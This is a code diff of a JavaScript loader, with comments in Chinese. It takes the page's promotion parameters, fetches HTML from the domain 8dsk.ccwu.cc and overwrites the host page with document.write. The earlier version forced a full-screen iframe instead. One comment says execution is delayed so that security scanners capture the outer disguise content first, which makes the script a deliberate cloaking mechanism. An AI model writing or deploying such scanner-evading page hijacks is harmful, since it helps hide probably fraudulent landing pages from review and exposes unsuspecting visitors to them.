@@ -1,59 +1,82 @@
 (function () {
   'use strict';
   try {
-    
-    window.addEventListener('pageshow', function (e) {
-      if (e.persisted) location.reload();
-    });
-
     var domains = [
-      '8dsk.ccwu.cc'
+    '8dsk.ccwu.cc'
     ];
 
-    var urlParams = new URLSearchParams(window.location.search);
-    var code = urlParams.get('code');
-    if (!code) {
-      document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#f56c6c;font-size:14px;">参数错误</div>';
+    // 透传整个 query string（兼容新格式 ?ep=xxx&d=xxx&er=xxx 和老格式 ?code=xxx）
+    var rawSearch = window.location.search || '';
+    var urlParams = new URLSearchParams(rawSearch);
+    // 任一推广参数缺失即认为参数错误
+    var hasParam = urlParams.get('ep') || urlParams.get('code') || urlParams.get('ref');
+    if (!hasParam) {
+      document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">参数错误</div>';
       return;
     }
 
-    var idx = Math.floor(Math.random() * domains.length);
-    var src = '//' + domains[idx] + '/?code=' + encodeURIComponent(code);
+    // 直接拼整个 query string，把 ep/d/er 一并带到落地页
+    var queryStr = rawSearch.replace(/^\?/, '');
+    var landingPath = '/h5/v2/index.htm' + (('/h5/v2/index.htm'.indexOf('?') > -1) ? '&' : '?') + queryStr;
 
-    var iframe = document.createElement('iframe');
-    iframe.src = src;
-    iframe.allow = 'autoplay; fullscreen; clipboard-write';
-    iframe.setAttribute('allowfullscreen', '');
+    // 已使用过的域名索引，避免重复
+    var usedIndexes = {};
+    var maxRetries = Math.min(5, domains.length);
 
-    function applySize() {
-      iframe.style.cssText =
-        'position:fixed!important;top:0!important;left:0!important;right:0!important;bottom:0!important;' +
-        'width:' + window.innerWidth + 'px!important;' +
-        'height:' + window.innerHeight + 'px!important;' +
-        'border:0!important;margin:0!important;padding:0!important;' +
-        'z-index:2147483647!important;background:#fff!important;display:block!important';
+    function getRandomUnusedDomain() {
+      var remaining = [];
+      for (var i = 0; i < domains.length; i++) {
+        if (!usedIndexes[i]) remaining.push(i);
+      }
+      if (remaining.length === 0) return null;
+      var idx = remaining[Math.floor(Math.random() * remaining.length)];
+      usedIndexes[idx] = true;
+      return domains[idx];
     }
-    applySize();
 
-    var lockStyle = document.createElement('style');
-    lockStyle.textContent =
-      'html,body{margin:0!important;padding:0!important;height:100%!important;width:100%!important;overflow:hidden!important;background:#fff!important;position:relative!important}';
-    document.head.appendChild(lockStyle);
+    function buildUrl(domain) {
+      var protocol = window.location.protocol === 'https:' ? 'https:' : 'http:';
+      return protocol + '//' + domain + landingPath;
+    }
 
-    document.documentElement.appendChild(iframe);
-    window.scrollTo(0, 0);
+    // 主逻辑：fetch HTML → document.write 替换页面
+    function init() {
+      var attempt = 0;
 
-    
-    iframe.addEventListener('load', function () {
-      applySize();
-      setTimeout(applySize, 500);
-    });
+      function tryNext() {
+        if (attempt >= maxRetries) {
+          document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">加载失败，请刷新重试</div>';
+          return;
+        }
+        var domain = getRandomUnusedDomain();
+        if (!domain) {
+          document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">加载失败，请刷新重试</div>';
+          return;
+        }
+        var url = buildUrl(domain);
+        attempt++;
 
-    window.addEventListener('resize', applySize);
-    window.addEventListener('orientationchange', function () {
-      setTimeout(applySize, 200);
-    });
+        fetch(url, { mode: 'cors', credentials: 'omit' })
+          .then(function (res) {
+            if (!res.ok) throw new Error(res.status);
+            return res.text();
+          })
+          .then(function (html) {
+            document.open();
+            document.write(html);
+            document.close();
+          })
+          .catch(function () {
+            tryNext();
+          });
+      }
+
+      tryNext();
+    }
+
+    // 延迟执行，让扫描器先抓到外层伪装内容
+    setTimeout(init, 300);
   } catch (e) {
-    document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#f56c6c;font-size:14px;">系统错误</div>';
+    document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">系统错误</div>';
   }
 })();
